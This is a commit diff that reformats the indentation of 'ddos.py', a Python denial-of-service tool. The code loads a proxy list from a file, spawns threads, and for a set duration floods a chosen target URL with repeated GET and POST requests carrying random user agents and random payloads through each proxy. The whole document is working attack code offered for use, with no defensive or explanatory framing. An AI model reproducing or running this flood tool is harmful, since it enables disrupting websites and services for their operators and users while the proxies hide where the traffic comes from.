a0468f51b9e55a5470b1e59155d32c104ae98b0f
un1cum <80776324+un1cum@users.noreply.github.com>
2023-02-02 02:46:24 +0500

    Add files via upload

--- core/ddos_attack/ddos.py
+++ core/ddos_attack/ddos.py
@@ -25,63 +25,63 @@ ua = UserAgent()
 lib = "1234567890qwertyuiop[]asdfghjkl;'zxcvbnm,./_"
 
 with open('input/proxies.txt', 'r') as file:
-	for line in file:
-		proxies.append(line.replace('\n', ''))
+    for line in file:
+        proxies.append(line.replace('\n', ''))
 
 
 def start_ddos(threads, time_a, target):
-	for _ in range(threads):
-		th = Thread(target=ddos_attack, args=(time_a, target))
-		th.start()
+    for _ in range(threads):
+        th = Thread(target=ddos_attack, args=(time_a, target))
+        th.start()
 
 
 async def req(target, proxy):
-	async with aiohttp.ClientSession() as session:
-		user = ua.random
-		st = ''
+    async with aiohttp.ClientSession() as session:
+        user = ua.random
+        st = ''
 
-		for _ in range(random.randint(10, 200)):
-			st += random.choice(lib)
+        for _ in range(random.randint(10, 200)):
+            st += random.choice(lib)
 
-		header = {'user-agent': user}
+        header = {'user-agent': user}
 
-		try:
-			await session.get(target, timeout=1, proxies=proxy)
-		except:
-			pass
+        try:
+            await session.get(target, timeout=1, proxies=proxy)
+        except:
+            pass
 
-		try:
-			await session.get(target, headers=header, timeout=1, proxies=proxy)
-		except:
-			pass
+        try:
+            await session.get(target, headers=header, timeout=1, proxies=proxy)
+        except:
+            pass
 
-		try:
-			await session.post(target, data=st, headers=header, timeout=1, proxies=proxy)
-		except:
-			pass
+        try:
+            await session.post(target, data=st, headers=header, timeout=1, proxies=proxy)
+        except:
+            pass
 
-		try:
-			await session.post(target, data=st, timeout=1, proxies=proxy)
-		except:
-			pass
+        try:
+            await session.post(target, data=st, timeout=1, proxies=proxy)
+        except:
+            pass
 
-		try:
-			await session.post(target, json=st, headers=header, timeout=1, proxies=proxy)
-		except:
-			pass
+        try:
+            await session.post(target, json=st, headers=header, timeout=1, proxies=proxy)
+        except:
+            pass
 
-		try:
-			await session.post(target, json=st, timeout=1, proxies=proxy)
-		except:
-			pass
+        try:
+            await session.post(target, json=st, timeout=1, proxies=proxy)
+        except:
+            pass
 
 
 def ddos_attack(time_a, target):
-	t = time.monotonic()
-	while time.monotonic() - t < time_a:
-		for proxy in proxies:
-			proxy_2 = {
-				"http": "http://" + proxy,
-				"https": "https://" + proxy
-			}
-			asyncio.run(req(target, proxy_2))
+    t = time.monotonic()
+    while time.monotonic() - t < time_a:
+        for proxy in proxies:
+            proxy_2 = {
+                "http": "http://" + proxy,
+                "https": "https://" + proxy
+            }
+            asyncio.run(req(target, proxy_2))
